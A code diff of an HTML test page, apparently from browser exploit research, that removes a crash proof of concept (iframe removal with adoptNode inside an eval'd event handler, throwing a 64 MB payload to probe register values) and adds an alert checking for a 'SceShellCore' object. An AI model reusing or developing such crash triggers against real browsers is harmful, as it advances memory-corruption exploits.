@@ -2,24 +2,10 @@
 <html>
 <body>
 <button onclick="main()">Trigger Crash</button>
+
 <script>
-function main() {
-    const f = document.body.appendChild(document.createElement('iframe'));
-    const a = document.createElement('div');
-    const b = a.appendChild(document.createElement('div'));
-
-    // سنستخدم حرفاً مختلفاً (مثلاً 'B' الذي قيمته 0x42) 
-    // لنرى هل سيتغير الـ rax في الـ Crash Dump
-    let payload = 'B'.repeat(1024 * 1024 * 64); 
-
-    a.addEventListener('a', eval(`(function () {
-        document.adoptNode(a);
-        f.remove();
-        throw { sourceURL: payload };
-    })`));
-
-    b.dispatchEvent(new Event('a', { bubbles: true }));
-}
+    alert("Test: " + (window.SceShellCore ? "Exists" : "Not Found"));
 </script>
+
 </body>
 </html>
